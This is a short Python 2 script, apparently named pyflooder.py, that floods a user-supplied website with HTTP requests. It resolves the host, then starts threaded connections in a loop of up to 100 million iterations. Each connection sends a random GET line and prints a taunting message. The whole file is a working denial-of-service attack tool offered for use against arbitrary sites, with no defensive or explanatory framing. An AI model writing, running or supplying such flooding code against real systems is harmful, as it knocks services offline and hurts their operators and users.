# -*- coding: utf-8 -*-
#Author : D4Vinci
#All copyrights to Squnity team

import socket,sys,random,time,string,threading

try:
    host = str(sys.argv[1]).replace("https://","").replace("http://","").replace("www","")
    ip = socket.gethostbyname( host )
except:
    print " Error:\nMake sure you entered the correct website"
    sys.exit(0)

if len(sys.argv)<4:
    port = 80
    ran=100000000

elif len(sys.argv)==4:
    port = int(sys.argv[2])
    ran=int(sys.argv[3])

else:
    print "ERROR\n Usage : pyflooder.py hostname port how_many_attacks"

global n
n=0

def attack():

    ip = socket.gethostbyname( host )
    global n
    msg=str(string.letters+string.digits+string.punctuation)
    data="".join(random.sample(msg,5))
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        n+=1
        dos.connect((ip, port))
        dos.send( "GET /%s HTTP/1.1\r\n" % data )
        print "\n "+time.ctime().split(" ")[3]+" "+"["+str(n)+"] #-#-# Hold Your Tears #-#-#"

    except socket.error:
        print "\n [ No connection! Server maybe down ] "

    dos.close()

print "[#] Attack started on",host,"|",ip,"\n"
nn=0

for i in xrange(ran):
    nn+=1
    t1 = threading.Thread(target=attack)
    t1.daemon =True # if thread is exist, it dies
    t1.start()

    t2 = threading.Thread(target=attack)
    t2.daemon =True # if thread is exist, it dies
    t2.start()

    if nn==100:
        nn=0
        time.sleep(0.01)
